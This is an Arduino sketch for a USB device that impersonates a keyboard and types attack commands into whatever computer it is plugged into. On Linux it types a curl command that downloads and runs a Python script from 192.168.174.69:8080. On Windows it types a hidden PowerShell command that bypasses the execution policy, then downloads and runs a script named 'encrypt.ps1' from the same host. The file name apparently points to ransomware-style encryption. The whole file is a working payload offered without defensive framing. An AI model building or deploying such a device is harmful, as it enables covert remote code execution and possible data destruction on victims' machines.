#include <Keyboard.h>

void setup() {
  Keyboard.begin(); // Initialize keyboard
  delay(5000);     // Brief wait for OS to recognize HID

  // === STEP 1: Try Linux - Open terminal with Ctrl + Alt + T ===
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000); // Wait for terminal to open
  Keyboard.println(
    "curl -s -o ~/Desktop/checkOS.py http://192.168.174.69:8080/Desktop/checkOS.py && "
    "chmod +x ~/Desktop/checkOS.py && python3 ~/Desktop/checkOS.py && exit"
  );
  Keyboard.press(KEY_RETURN); // Execute the command
  Keyboard.releaseAll();
  delay(3000); // Wait for Linux command execution

  // Open Run dialog (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(700);

  // Type the PowerShell command
  Keyboard.print("powershell -NoP -W Hidden -C \"Set-ExecutionPolicy Bypass -Scope CurrentUser -Force; iwr 'http://192.168.174.69:8080/Desktop/encrypt.ps1' -OutFile $env:USERPROFILE\\Desktop\\enc.ps1; & $env:USERPROFILE\\Desktop\\enc.ps1; Stop-Process -Name powershell -Force\"");
  delay(1000);
  Keyboard.press(KEY_RETURN); // Execute the command
  Keyboard.releaseAll();

  Keyboard.end();
  // Halt execution
  for(;;); // Efficient halt
}

void loop() {
  // No repeated actions needed
} 
